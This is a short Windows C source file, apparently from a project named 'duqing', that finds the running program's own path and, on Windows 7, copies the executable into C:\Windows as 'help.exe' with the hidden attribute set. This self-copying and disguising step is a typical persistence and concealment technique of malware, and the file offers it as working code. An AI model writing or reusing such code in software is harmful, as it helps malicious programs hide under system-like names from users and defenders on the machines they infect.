#include "cp.h"




dq_code_t new_file_from_srcfile(wchar_t * dst_path, wchar_t * dst_filename, wchar_t *src_file)
{
	wchar_t dst_file[1024] = {0};
	wsprintf(dst_file, L"%s\\%s", dst_path, dst_filename); 

	int ret = CopyFile(src_file, dst_file, FALSE);
	if(ret)
	{
		DWORD file_attr = GetFileAttributes(dst_file);
		SetFileAttributes(dst_file, file_attr | FILE_ATTRIBUTE_HIDDEN);
	}
	return DQ_OK;
}

void copy_to_hide_directory()
{
	wchar_t path[5000]    = {0};
	wchar_t dst_path[256] = {0};

	//GetCurrentDirectory(sizeof(path)/2, path);//E:\share\git\cber\duqing
	GetModuleFileName(NULL, path, sizeof(path)/2);
	//wprintf(L"%s \n", path); //E:\share\git\cber\duqing\Debug\duqing.exe

	OSVERSIONINFOEX os={};
	get_system_version(&os);

	DWORD ver = (os.dwMajorVersion << 8) + os.dwMinorVersion;
	switch (ver)
	{
		case WIN_NT4:
			break;
		case WIN_WIN2K:
			break;
		case WIN_WINXP:
			break;
		case WIN_WS03:
			break;
		case WIN_WIN7:
			new_file_from_srcfile(L"C:\\Windows", L"help.exe", path);
			break;

	}

}



